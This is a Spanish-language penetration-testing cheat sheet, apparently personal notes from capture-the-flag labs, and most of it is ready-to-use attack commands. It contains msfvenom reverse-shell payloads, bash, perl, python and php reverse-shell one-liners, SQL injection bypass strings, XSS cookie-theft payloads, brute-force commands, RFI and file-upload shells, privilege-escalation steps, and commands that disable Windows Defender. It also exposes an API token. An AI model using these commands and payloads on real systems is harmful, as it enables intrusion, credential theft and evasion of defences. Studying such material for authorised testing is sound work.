FOR LEGAL PURPOSES ONLY:

      
                       ."-,.__
                       `.     `.  ,
                    .--'  .._,'"-' `.
                   .    .'         `'
                   `.   /          ,'
                     `  '--.   ,-"'
                      `"`   |  \
                         -. \, |
                          `--Y.'      ___.
                               \     L._, \
                     _.,        `.   <  <\                _
                   ,' '           `, `.   | \            ( `
                ../, `.            `  |    .\`.           \ \_
               ,' ,..  .           _.,'    ||\l            )  '".
              , ,'   \           ,'.-.`-._,'  |           .  _._`.
            ,' /      \ \        `' ' `--/   | \          / /   ..\
          .'  /        \ .         |\__ - _ ,'` `        / /     `.`.
          |  '          ..         `-...-"  |  `-'      / /        . `.
          | /           |L__           |    |          / /          `. `.
         , /            .   .          |    |         / /             ` `
        / /          ,. ,`._ `-_       |    |  _   ,-' /               ` \
       / .           \"`_/. `-_ \_,.  ,'    +-' `-'  _,        ..,-.    \`.
      .  '         .-f    ,'   `    '.       \__.---'     _   .'   '     \ \
      ' /          `.'    l     .' /          \..      ,_|/   `.  ,'`     L`
      |'      _.-""` `.    \ _,'  `            \ `.___`.'"`-.  , |   |    | \
      ||    ,'      `. `.   '       _,...._        `  |    `/ '  |   '     .|
      ||  ,'          `. ;.,.---' ,'       `.   `.. `-'  .-' /_ .'    ;_   ||
      || '              V      / /           `   | `   ,'   ,' '.    !  `. ||
      ||/            _,-------7 '              . |  `-'    l         /    `||
      . |          ,' .-   ,' ||               | .-.        `.      .'     ||
       `'        ,'    `".'    |               |    `.        '. -.'       `'
                /      ,'      |               |,'    \-.._,.'/'
                .     /        .               .       \    .''
              .`.    |         `.             /         :_,'.'
                \ `...\   _     ,'-.        .'         /_.-'
                 `-.__ `,  `'   .  _.>----''.  _  __  /
                      .'        /"'          |  "'   '_
                     /_|.-'\ ,".             '.'`__'-( \
                       / ,"'"\,'               `/  `-.|"


=========================================================================================

	                  .___      ____              __    ________  
	                __| _/____ /_   | ________ __|  | __\_____  \ 
	               / __ |\__  \ |   |/  ___/  |  \  |/ /  _(__  < 
	              / /_/ | / __ \|   |\___ \|  |  /    <  /       \
	              \____ |(____  /___/____  >____/|__|_ \/______  /
	                   \/     \/         \/           \/       \/ 

=========================================================================================


===========================
===        PORTS        ===
===========================


COMMON PORTS
_________________________________________________________________________________________

20-21	 FTP
22	 SSH
23	 Telnet
25	 SMTP
53	 DNS
69	 TFTP
80	 HTTP
88	 Kerberos
102	 MS Exchange
115	 SFTP
110	 POP3
123	 NTP
135	 RPC
137-39	 NETBIOS
143	 IMAP4
179	 BGP
443	 HTTPS
445	 SMB
465	 SMTP over SSL
587	 SMTP
1433-34	 Microsoft SQL Server
3306	 MySQL
3389	 RDP
5355	 LLMNR
5985	 WinRM HTTP
5986	 WinRM HTTPS
8080-81	 HTTP Proxy


===========================
===     ENUMERATION     ===
===========================


HOSTS DISCOVERY
_________________________________________________________________________________________

# Enumera los host
	sudo arp-scan [rango IP/MS] -g
	sudo arp-scan -I [interfaz] [rango IP/MS] -g
	sudo netdiscover -r [rango IP/MS]
	sudo nbtscan -r [rango IP/MS]
	masscan   ---   https://www.kali.org/tools/masscan/


NMAP
_________________________________________________________________________________________

# Enumera los puertos abiertos
	nmap -vv -sVC -T5 [RHOST]   ---   CTF
	nmap -vv -T5 -sV --script vuln [RHOST]   ---   CTF
	nmap -vv -sC -sV -p- [RHOST]
	nmap -vv -sV -sU [RHOST]   ---   escaneo UDP
	nmap -vv [rango IP/MS]

# nmap firewall
	nmap -vv -sV --mtu 16 --source-port 443 --spoof-mac 81:49:fd:8a:46:51 [RHOST]
	nmap -vv -sV -f -sS -D 8.8.8.8,20.20.20.20,192.168.54.20,24.132.225.31 [RHOST]

# https://nmap.org/man/es/index.html


FTP 20/21
_________________________________________________________________________________________

# Si el protocolo FTP esta abierto, siempre probar a entrar anonimamente 
	ftp [IP]
	anonymous
	ftp> passive
	ftp> ls
	ftp> get [FILE]
	exit
# Saber la version del proFTPD
	nc 10.10.108.111 ftp
	SITE CPFR /etc/passwd
	SITE CPTO /var/tmp/passwd
# Ejemplo, consiguiendo credenciales ssh
	SITE CPFR /home/kenobi/.ssh/id_rsa
	SITE CPTO /var/tmp/id_rsa
	sudo mkdir /mnt/kenobiNFS
	sudo mount 10.10.59.82:/var /mnt/kenobiNFS
	ls -la /mnt/kenobiNFS
	cp /mnt/kenobiNFS/tmp/id_rsa .
	sudo chmod 600 id_rsa 
	ssh -i id_rsa kenobi@10.10.59.82


SMB 445
_________________________________________________________________________________________

# Mostrar, controlar o manipular recursos compartidos
	smbclient -L [RHOST] -N
# Conectarse, listar y descargar recursos
	smbclient //[RHOST]/[FILE] -N
	dir
	prompt off
	mget *
	get [FILE]

https://www.samba.org/samba/docs/4.9/man-html/smbclient.1.html

	enum4linux -a [RHOST]
	nmap -p445 --script smb* [RHOST]
	smbmap -H [IP]
	smbmap -H [IP] -u [USER] -p [PASS]   ---   probar usuario y una única contraseña para ver recursos compartidos


RDP 3389
_________________________________________________________________________________________

	nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 [RHOST]   ---   lanza 3 scripts importantes para la vuln del 3389 
	xfreerdp /u:[USER] /p:[PASS] /v:[IP] /cert-ignore   ---   conectarse por RDP a un equipo


AUTORECON TOOL
_________________________________________________________________________________________

# Lanza un conjunto grande de herramientas para enumeracion (no incluye evasion de firewall)
	sudo apt install autorecon
	sudo autorecon [RHOST]


===========================
===      PENTESTING     ===
===========================


METASPLOIT
_________________________________________________________________________________________

# Actualizar
	sudo apt install metasploit-framework
# Arrancar
	msfconsole
# Mostrar categorias
	show [CATEGORY]
# Buscar exploit, payload...
	search [name exploit]
# Usar la herramienta
	use [nombre o nº lista]
	show payloads   ---   muestra PL para ese exploit, siempre coger reverse
	show info   ---   muestra la informacion
# Ver requerimientos de la herramienta
	show options			
# Rellenar campos necesarios
	set [nombre campo] [dato]
# Lanzar herramienta
	run
# Ex:
	search ms17-010
	use exploit/windows/smb/ms17_010_eternalblue
	options
	set RHOSTS 10.10.22.199
	set LHOST 10.0.1.20
	run
	meterpreter > help
	meterpreter > shell
	C:\Windows\system32>


WITHOUT METASPLOIT
_________________________________________________________________________________________

# Buscar exploits:
# https://www.exploit-db.com/
# https://sploitus.com/

# Busqueda exploits en Kali. Es espejo de exploit-db.com.
	sudo apt update && apt -y install exploitdb
	searchsploit MS17-010
	searchsploit -m 42315
# https://acortar.link/searchsploit
# GitHub > code > copiar reco
	git clone https://github.com/d4t4s3c/Win7Blue.git
	# Seguir indicaciones, en este caso especifico:
	chmod +x Win7Blue   ---   Permiso de ejecucion
	./Win7Blue
# Ejemplo de largar exploit
	python [Exploit Python File] [Target’s IP Address] [PORT]


===========================
===      ENCODEAR       ===
===========================


# Payload sin endoder:
	msfvenom -p windows/meterpreter/reverse_tcp RHOST=[RHOST] LHOST=[LHOST] LPORT=[4444] -f exe > reverse.exe
# Payload con endoder:
	msfvenom -p windows/meterpreter/reverse_tcp RHOST=[RHOST] LHOST=[LHOST] LPORT=[4444] -e x86/shikata-ga-nai -i 250 -f exe > encoded.exe


===========================
===      CRACKING       ===
===========================


# Repositorios de diccionarios
	https://github.com/danielmiessler/SecLists
	https://github.com/hackingyseguridad/diccionarios/tree/master

# Kali
	/usr/share/wordlists/   ---   ubicacion de dicc
	cat rockyou.txt | grep [CAMPO]   ---   saber si esta en la lista


HASH
_________________________________________________________________________________________

# Hash identifier / verifier WEB
	https://hashes.com/en/decrypt/hash

# Hash identifier Kali
	hash-identifier
	HAST: [HAST]
# Hash verifier Kali
	hashcat -m [NºHAST] [HAST] /usr/share/wordlists/rockyou.txt


CRACK WITH JOHN
_________________________________________________________________________________________

# JohnTheRipper, ver cifrados que admite. 
	john --list=formats
	john --list=formats | grep md5
	john --list=formats | grep MD5
	sudo john --format=[FORMAT] --wordlist=[path to wordlist] [path to file]
	ex: sudo john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt /Downloads/hast.txt

# Borrar logs de John
	rm ~/.john/john.*

# Crack teniendo acceso a /etc/passwd y /etc/shadow
	unshadow passwd.txt shadow.txt > unshadow.txt
# Suele ser comun el formato de sha512. Sera comun usar el --format=sha512crypt
	john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadow.txt

# Crack pass ZIP RAR con John
	zip2john [ZIP] > [TXT]
	rar2john [RAR] > [TXT]
	ex: zip2john secure.zip > secure.txt
	john --wordlist=/usr/share/wordlists/rockyou.txt secure.txt

# Crack clave privada SSH id_rsa
	ssh2john id_rsa > id_rsa.txt
	john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt
	ssh [USER]@[IP]
	[PASS_SSH]


CRACK WITH HYDRA
_________________________________________________________________________________________

# Hydra
	hydra -L --wordlist=[path to wordlist] -P --wordlist=[path to wordlist] [IP] [PORT]
	hydra -L --wordlist=/usr/share/wordlists/user.txt -P --wordlist=/usr/share/wordlists/pass.txt 10.10.1.10 ssh
	ssh [USER]@[IP]
	[PASS_SSH]


===========================
===      WEB RISKS      ===
===========================


GUIA OWASP TOP 10 (2021)
_________________________________________________________________________________________

AO1:2021-Broken Access Control
A02:2021-Cryptographic Failures
A03:2021-Injection
A04:2021-Insecure Design
A05:2021-Security Misconfiguration
A06:2021-Vulnerable and Outdated Components
A07:2021-Identification and Authentication Failures
A08:2021-Software and Data Integrity Failures
A09:2021-Security Logging and Monitoring Failures*
A10:2021-Server-Side Request Forgery*
	*From the Survey

# https://owasp.org/www-project-top-ten/


===========================
===   ENUMERATION WEB   ===
===========================


FIRST STEPS
_________________________________________________________________________________________

# Comprobar puertos y versiones del 80/443
	nmap -vv -p80 -sV [IP]
	nmap -vv -p443 -sV [IP]

# Comprobar si hay una pagina en el buscador
	http://[IP]   o   https://[IP]
	Ctrl U   o   View Page Source
	Buscar el dominimo.

# En caso de que este sin los CSS. Editamos nuestro /etc/hosts/
	sudo nano /etc/hosts/
	[IP] [DOMAIN]
	Ctrl O + Enter
	Ctrl X


DNS
_________________________________________________________________________________________

# Pedir al DNS su base de datos de registros
	dig AXFR [DOMAIN] @artemis.ttd.net   ---   el @ solo en casos de tener varios servidores

# Enumerar informacion del DNS
	nslookup
	> set type=NS
	> [DOMAIN]


WHATWEB
_________________________________________________________________________________________

# Enumera tecnilogias web y versiones: librerias de JS, servidores, direcciones email, frameworks, etc. 
	whatweb -v test.com

# Extension del navegador que hace la misma funcion: Wappalizer


LINKFINDER
_________________________________________________________________________________________

# Enumera los link de la pagina web, la descargamos e instalamos.
# https://github.com/GerbenJavado/LinkFinder
	git clone https://github.com/GerbenJavado/LinkFinder.git
	cd LinkFinder
	python setup.py install
	pip3 install -r requirements.txt

# Lanzar la herramienta
	python3 linkfinder.py -i http://www.test.com -o cli


SSLSCAN / OPENSSL
_________________________________________________________________________________________

# Analizar el protocolo SSL/TLS, versiones, firmas, vulnerabilidades ssl (heartbleed), etc.
	sslscan https://www.test.com   o   [IP]
	openssl s_client -connect test.com:443   ---   ver certificados SSL


NIKTO
_________________________________________________________________________________________

# Escaner de vulnerabilidades
	nikto -h test.com
	nikto -h 192.168.1.70 -p 8484


FUZZING WEB
_________________________________________________________________________________________

# Sacar rutas activas
	gobuster dir -u https://[IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	gobuster dir -u https://[IP] -w /usr/share/wordlists/dirb/big.txt [-o safeintxt.txt (opcional)]

	dirb http://[IP]   ---   si no le especificas usa por defecto el common.txt
	dirb http://[IP] -w /usr/share/wordlists/dirb/big.txt

	dirsearch -u http://[IP]/ -w /usr/share/wordlists/dirb/big.txt -e php,js,html,txt,pdf,docx -f

	dirbuster   ---   interfaz grafica

# Sacar subdominios
	gobuster vhost -u http://[IP]/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt

	ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "host:FUZZ.empline.thm" -u 'http://empline.thm/' -fs 14058

# https://dnsdumpster.com/


WEBCHECK
_________________________________________________________________________________________

# Herramienta web que enumera gran cantidad de informacion
# https://web-check.xyz/


CURL
_________________________________________________________________________________________

# Preguntar por los parametros de http
	curl -X [PARAMETER] http://www.test.com
	[PARAMETER]: GET, POST, PUT, DELETE, HEAD

# Informacion banner grabbing web
	curl -IL https://www.test.com

# https://www.keycdn.com/support/popular-curl-examples
# https://osint.com.ar/domina-curl-con-esta-guia-esencial-de-comandos/
# https://github.com/frizb/HackingWithCurl
# https://www.stationx.net/curl-cheat-sheet/
# https://manasharsh.medium.com/hacking-with-curl-unleash-the-cli-beast-fdf13ec342cc


ZAPROXY
_________________________________________________________________________________________

# Aplicacion Kali que hace fuzzing, busquedas de vulnerabilidades, versiones, tecnologias, etc.


WAFW00F
_________________________________________________________________________________________

# Saber si la pagina web esta detras de un WAF
	waf00f https://www.test.com


HEXHTTP
_________________________________________________________________________________________

# Identificador de vulnerabilidades, https://github.com/c0dejump/HExHTTP
	git clone https://github.com/c0dejump/HExHTTP.git
	python3 hexhttp.py -u 'https://test.com/'


WPSCAN ENUMERATION
_________________________________________________________________________________________

# Solo para WORDPRESS, funciona mejor con API TOKEN
	wpscan --url [URL] --api-token [TOKEN]

# Detecta vulnerabilidades, malas configuraciones y desactualizadas
	wpscan --url http://www.test.com --api-token msmN6za0x9xq3lplCTjmB8KihQqKsulJK203QUKRQg0
	wpscan --url [URL] -e u   ---   enumera usuarios
	wpscan --url [URL] -e vp   ---   enumera plugins vulnerables


===========================
===   PENTESTING  WEB   ===
===========================


LOGIN ATT DICTIONARY
_________________________________________________________________________________________

# WPSCAN # Solo para webs de wordpress
	wpscan --url [URL] --usernames users.txt --passwords rockyou.txt --max-threads 5

# HYDRA # La informacion la sacamos del inspector en Network, al lanzar la peticion. Header y Cookie. Hay que sacar mensaje de fallo en el login.
	hydra -L user.txt -P rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"

# Ex:
	hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low:F=Username and/or password incorrect' 
	hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
	hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
	hydra -L users.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302'   ---   Panel wordpress que no muestra error y redirecciona


COMMAND INJECTION
_________________________________________________________________________________________

# Cuando se puede introducir comandos del sistema.
# Tras introducir el valor que espera se realizan los comandos para evadirlo y hacer un bypass.
	[VALUE]; whoami
	[VALUE] && whoami
	[VALUE] | whoami
# Siempre intentar ir a mas
	[VALUE] && cat /etc/passwd
	[VALUE]; echo "\nUser: $(whoami)"; echo "Hostname: $(hostname)"
# Hasta intentar tomar el control
	Kali
		nc -lvnp 4444   ---   abrir un puerto
	Target
		bash -i >& /dev/tcp/[LHOST]/4444 0>&1
		perl -e 'use Socket;$i="[LHOST]";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LHOST]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
		php -r '$sock=fsockopen("[LHOST]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
# https://gist.github.com/IN4G4I/a230443081c705836534138d8df99098
# https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/


XSS
_________________________________________________________________________________________

# Cuando se puede inyectar codigo en JavaScript

# XSS DOM # El script se ejecuta dentro del Document Object Model. Se incluye en la url y no se envia al servidor.
# Comprobar si es subceptible al XSS probar
	<script>alert(test);</script>
# Extraer las cookies
	<script>alert(document.cookie);</script>
	#<script>alert(document.cookie);</script>
	" ></option></select><img src=x onerror="alert(document.cookie)">

# XSS Reflected # El script inyectado se refleja fuera del servidor, enviando una peticion y el servidor mostrando de vuelta.
# Comprobar si es subceptible al XSS probar
	<img src=x onerror="alert(test)">
# Extraer las cookies	
	<img src=x onerror="alert(document.cookie)">

# XSS Stored # El script inyectado se almacena en el servidor, afectando a todo el que entre.
# Comprobar si es subceptible al XSS probar
	<img src=x onerror="alert(test)">
# Extraer las cookies
	<img src=x onerror="alert(document.cookie)">
	<sCrIpT>alert(document.cookie);</ScRiPt>
	<ImG src=x onerror="alert(document.cookie)">


SQLi
_________________________________________________________________________________________

# Cuando se puede introducir consultas SQL
# Para comprobar si es susceptible a SQLi, lo primero es probar a introducir una comilla simple.
	'   ---   You have an error in your SQL syntax....
	'or '1'='1   ---   Te montraria toda la tabla.
# Otras opciones
	admin' or '1'='1
	" or "1"="1
	" or "1"="1"--
	" or "1"="1"/*
	" or "1"="1"#
	" or 1=1
	" or 1=1-
	") or "1"="1
	") or "1"="1"--
	") or "1"="1"/*
	") or "1"="1"#
	") or ("1"="1
	") or ("1"="1"--
	") or ("1"="1"/*
	") or ("1"="1"#
	) or '1`='1-
# Eludir la autenticación.
	'-'
	' '
	'&'
	'^'
	'*'
	' or 1=1 limit 1 -- -+
	'="or'
	' or ''-'
	' or '' '
	' or ''&'
	' or ''^'
	' or ''*'
	or true--
	" or true--
	' or true--
	") or true--
	') or true--
	' or 'x'='x
	') or ('x')=('x
	')) or (('x'))=(('x
	or 2 like 2
	or 1=1/*
	admin' --
	admin' -- -
	admin' #
	admin'/*
	admin') or ('2' LIKE '2
	admin') or ('2' LIKE '2'#
	admin') or ('2' LIKE '2'/*
	admin' or '1'='1
	admin' or '1'='1'--
	admin' or '1'='1'#
	admin' or '1'='1'/*
	admin'or 1=1 or ''='
	admin' or 1=1
	1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
	1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
	' UNION SELECT user, password FROM users#
	1 or 1=1 UNION SELECT user, password FROM users#


SQLi # SQLMAP
_________________________________________________________________________________________

# Sin BurpSuite, pueden dar problemas por las cookies.
	sqlmap -u http://[IP] --cookie [COOKIE] -p [PARAMETER]
	ex: sqlmap -u http://10.10.145.198/vulnerabilities/sqli/ --cookie m8b54ha53ujhv6on8omkcg0tf2 -p id
	sqlmap -u http://[IP] –os-shell
	sqlmap -u http://[IP] –dump
	sqlmap -u http://[IP]/?id=1 --dbs
	sqlmap -u http://[IP]/?id=1 -D [DATABASE-NAME] --tables
	sqlmap -u http://[IP]/?id=1 -D [DATABASE-NAME] -T [TABLE-NAME] --columns
	sqlmap -u http://[IP]/?id=1 -D [DATABASE-NAME] -T [TABLE-NAME] -C [DATO1],[DATO2],[DATO3] --dump-all

# Con BurpSuite, generar las consultas que desvelan el SQLi para que aparezcan en Proxy > HTTP history
# Boton derecho en Reqest > Save item y nombrar como request.req
	sqlmap -r request.req -p [PARAMETER-VULN] --batch --dbs
	sqlmap -r request.req -D [DATABASE-NAME] --tables
	sqlmap -r request.req -D [DATABASE-NAME] -T [TABLE-NAME] --columns
	sqlmap -r request.req -D [DATABASE-NAME] -T [TABLE-NAME] -C [DATO1],[DATO2],[DATO3] --dump
# Ex:
	sqlmap -r request.req -p id --batch --dbs
	sqlmap -r request.req -D dvwa --tables
	sqlmap -r request.req -D dvwa -T users --columns 
	sqlmap -r request.req -D dvwa -T users -C user,first_name,password --dump
# En este paso si estan encriptadas las pass te lo intenta desencriptar, indicar un dicc.
	> /usr/share/wordlists/rockyou.txt

# https://hackersonlineclub.com/sql-injection-cheatsheet/


CSRF
_________________________________________________________________________________________

# Falsificar o envenenar una accion normal, como un cambio de contraseña
# Tras cambiar la contraseña copiar el link 
# Ese mismo link, cambiar contraseña y acortar el url (si no hay protección CSRF)


FILE INCLUSION / LOCAL & REMOTE
_________________________________________________________________________________________

# LFI # MSi la URL hay una pagina que se utiliza para incluir el archivo
	url:http://192.168.170.131/vulnerabilities/fi/?page=include.php
# Se puede intentar un bypass con este URL, sacando users
	url:http://192.168.170.131/vulnerabilities/fi/?page=../../../../../../etc/passwd
	url:http://192.168.170.131/vulnerabilities/fi/?page=../../../../../../proc/cpuinfo
# Si observas que hay una condicion, como que el nombre del archivo empiece por 'file'
	url:http://192.168.170.131/vulnerabilities/fi/?page=file/../../../../../../etc/passwd

# RFI # Para ir mas haya intentar cargar un archivo en la pagina con una reverse shell
# Por ejemplo, una pagina que acepte php: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
# Crear el archivo, editar los campos y editar permisos para ejecucion
	ex:	sudo nano reverse.php
			$ip = [IP_KALI]
			$port = 4444
		sudo chmod +x reverse.php
# Convertir kali en un servidor web con un modulo en python. 
# Activa de manera temporal un servicio web mostrando la carpeta en la que te encuentres.
	python3 -m http.server 8080
# Target
	url:http://192.168.170.131/vulnerabilities/fi/?page=http://[IP_KALI]:8080
# Abrir puerto de reverse en Kali
	nc -lvnp 4444
# Target, se quedara a la espera
	url:http://192.168.170.131/vulnerabilities/fi/?page=http://[IP_KALI]:8080/reverse.php
# Acceso por comandos, intentar conseguir acceso root
	

FILE UPLOAD
_________________________________________________________________________________________

# Si no esta bien filtraso, se puede intentar subir un archivo php para cargar una reverse shell
	nc -lvnp 4444
# Subir reverse.php usado en RFI
	http://[RHOST]/hackable/uploads/reverse.php


CPDoS
_________________________________________________________________________________________

# https://cpdos.org/


===========================
===  PENTESTING MOBILE  ===
===========================


MOBSF
_________________________________________________________________________________________

# Detectar vulnerabilidades de seguridad en aplicaciones móviles iOS y Android
	sudo apt install python3-dev python3-venv python3-pip build-essential libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg62-turbo-dev zlib1g-dev wkhtmltopdf python3-poetry git gunicorn python3-virtualenv
	pip3 install virtualenv
	virtualenv -p python3 venv


===========================
===  POST EXPLOITATION  ===
===========================
 

PRIVILEGE ESCALATION LINUX
_________________________________________________________________________________________

# ENUM Manual #
	hostname   ---   nombre de la maquina
	pwd   ---   ruta donde estoy
	whoami   ---   quien soy
	env   ---   ver variables de entorno
	id   ---   ver id que tengo
	uname -a   ---   version del kernel
	cat /proc/version   ---   version del kernel
	sudo -l   ---   muestra comandos sudo que pueda utilizar el user
	cat /etc/crontab   ---   tareas programadas
	cat /etc/passwd   ---   sacar usuarios
	systemctl list-timers   ---   muestra los temporizadores de systemd
	history   ---   ver el historial
	pspy   ---   ver comandos que se ejecutan en segundo plano
	ps -ef   ---   ver los procesos
	ifconfig   ---   sacar NICs (Pivoting)
	getcap -r / 2>/dev/null   ---   listar las capabilities activas
	netstat	   ---   ver los servicios que estan corriendo
	ss -tulpn   ---   ver los servicios que estan corriendo
	find / -perm -u=s -type f 2>/dev/null   ---   enumerar binarios con permiso suid
	find / -type f -perm -04000 -ls 2>/dev/null   ---   enumerar binarios con permiso suid
	find / -perm -4000 2>/dev/null | xargs ls -l   ---   enumerar binarios con permiso suid
*Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios 
pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de 
configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios:
find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;

# ENUM Auto LinPEAS #
	wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
	cd /usr/share/peass/linpeas

# KERNEL EXPLOITS # Versiones muy desactualizadas
	lsb_release -a   ---   distribucion exacta de ubuntu
	uname -a
	cat /proc/version
# Buscar exploits contra ese kernel
	searchsploit 3.13.0
	searchsploit -m 37292.c   ---   copiar exploit
# Pasarlo al target con 
	Kali   ---   sudo python3 -m http.server 8080
	Target   ---   wget http://10.10.120.64:8080/37292.c
# En este caso, al ser C se compila o si no tiene permisos de ejecucion se le añaden
	gcc 37929.c -o xploit
	chmod +x [FILE]
# Ejecutar exploit
	./xploit


# SUDO # Mala configuración de sudo
	sudo -l
	ex: (ALL) NOPASSWD: /usr/bin/find
# Buscar binarios de Unix para posibles malas configuraciones
	https://gtfobins.github.io/
	ex: sudo find . -exec /bin/sh \; -quit


# SUID # Ejecutar herramientas o comandos con permisos del propietario, como root
	find / -perm -u=s -type f 2>/dev/null
	find / -type f -perm -04000 -ls 2>/dev/null
	find / -perm -4000 2>/dev/null | xargs ls -l
# No vale para escalar privilegios, pero si sirve para realizar funciones no permitidas que ayuden a escalar o acceder a /etc/shadow
# Al ejecutar los siguientes comandos, añades permiso suid, a find por ejemplo. Pudiendo escalar
	which find
	chmod 4755 /usr/bin/find   ---   añade el suid
	ls -lah /usr/bin/find   ---   se vera en rojo y pondra el permiso "s"
	find . -exec /bin/sh \; -quit


# CRON JOBS # Ver las tareas programadas mal configuradas
	cat /etc/crontab
# Comprobar los programas lanzados por root y ver si tenemos permisos de escritura en alguno
	ls -lah
# Si hay permisos editar un programa lanzado por root
# Buscar una reverse shell y editar con el nombre del programa encontrado
	reverse shell   ---   https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
	nano programa.sh
	bash -i >& /dev/tcp/[RHOST]/[PORT] 0>&1
# Como siempre, poner permisos de ejecucion si no los tiene
	chmod +x programa.sh
#En Kali solo habria que permanecer a la escucha
	nc -lvnp 4444
	root~#

# PATH #
# NFS #


PRIVILEGE ESCALATION WINDOWS
_________________________________________________________________________________________

# ENUM Manual #
	hostname   ---   nombre de la maquina
	whoami   ---   quien soy
	whoami /priv   ---   muestra permisos privigeliados que puedes usar
	syteminfo   ---   saber los parches, OS version, entre otra info de Windows
	ipconfig   ---   info de las NIC
	cmdkey /list   ---   ver credenciales guardadas
	icacls [PATH]   ---   saber el permiso sobre una ruta
	schtasks /query   ---   
	schtasks /query /fo LIST /v   ---   ver tareas programadas
	dir   ---   listar
	sc   ---   
	set   ---   
	netstat   ---   
	reg /query   ---   
	sc query windefend   ---   
	sc queryex type=service   ---   	
	netsh advfirewall firewall dump   ---   dumpear si tiene firewall o antivirus
	Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
	WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName   ---   enumera antivirus
*Probar a deshabilitar el escaneo de todos los ficheros descargados y/o adjuntos para subir nuestros ficheros: 
"Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus" luego → "Set-MpPreference -DisableIOAVProtection $true"
# LISTA DE PERMISOS # https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls

# ENUM Auto # WinPEAS	
	/usr/share/peass/winpeas


# INSECURE SERVICE PERMISSIONS # Permisos inseguros en servicios. Preguntar servicio y el programa
	sc qc daclsvc
		BINARY_PATH_NAME: "C:\Program Files\DACL Service\daclservice.exe"
		LocalSystem
# Enumerar los permisos en el servicio
	C:\PrivEsc\accesschk.exe /accepteula -uwcqv [USER] [servicio]	
	C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc   ---   enumera los permisos del servicio
		SERVICE_CHANGE_CONFIG
# Aprovechando este error, crear una reverse shell en Kali
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP KALI] LPORT=[PORT] -f exe -o reverse.exe
	PYTHON3 -M HTTP.SERVER 8080
# Target coger la reverse y cambiar el BINARY_PATH_NAME
	curl -O http://[IP KALI]:[PORT]/reverse.exe
	sc config daclsvc binpath= "\"C:\Users\user\reverse.exe\""
# Kali
	nc -lvnp 4444
# Target
	net stop daclsvc   ---   en caso de necesitar parar el servicio
	net start daclsvc


# UNQUOTED SERVICE PATH # Rutas de servicio estando sin comillas. Preguntar servicio y el programa
	sc qc unquotedsvc
		BINARY_PATH_NAME: C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
# Enumerar los permisos en el servicio
	C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
# Aprovechando los permisos RW a partir de Common Files, pasar un reverse shell llamada common.exe
	copy C:\Users\user\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
# Tambien se puede cambiar el nombre a mano
	ren reverse.exe Common.exe
# Kali
	nc -lvnp 4444
# Target
	net stop unquotedsvc   ---   en caso de necesitar parar el servicio
	net start unquotedsvc


# WEAK REGISTRY PERMISSIONS # Si se puede leer y escribir en el registro. Preguntar servicio y el programa
	sc qc regsvc
# Enumerar los permisos en el servicio
	C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
# Cambiar la ruta del registro
	reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\user\reverse.exe /
# Kali
	nc -lvnp 4444
# Target
	net stop regsvc   ---   en caso de necesitar parar el servicio
	net start regsvc


# INSECURE SERVICE EXECUTABLES # Ejecutables mal configurados en servicios. Preguntar servicio y el programa
	sc qc filepermsvc
# Enumerar los permisos en el servicio
	C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
